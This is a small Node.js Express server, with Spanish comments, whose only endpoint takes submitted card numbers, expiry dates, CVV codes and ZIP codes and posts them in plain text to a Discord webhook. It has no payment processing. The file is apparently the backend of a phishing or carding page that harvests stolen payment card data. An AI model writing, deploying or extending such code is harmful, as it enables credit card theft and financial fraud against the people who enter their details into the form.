const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Puerto de Railway o local
const PORT = process.env.PORT || 3000;

// Endpoint para recibir los datos del formulario
app.post('/api/submit-form', async (req, res) => {
    try {
        const { card, mm, aa, cvv, zip } = req.body;

        // Obtener el webhook URL de las variables de entorno
        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

        if (!webhookUrl) {
            console.error('DISCORD_WEBHOOK_URL not configured');
            return res.status(500).json({ error: 'Server configuration error' });
        }

        const content = {
            embeds: [{
                title: 'New form submission',
                color: 15158332,
                fields: [
                    { name: 'Card', value: card || 'N/A', inline: true },
                    { name: 'MM', value: mm || 'N/A', inline: true },
                    { name: 'AA', value: aa || 'N/A', inline: true },
                    { name: 'CVV', value: cvv || 'N/A', inline: true },
                    { name: 'ZIP Code', value: zip || 'N/A', inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(content)
        });

        if (!response.ok) {
            throw new Error('Discord webhook failed');
        }

        res.json({ success: true });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
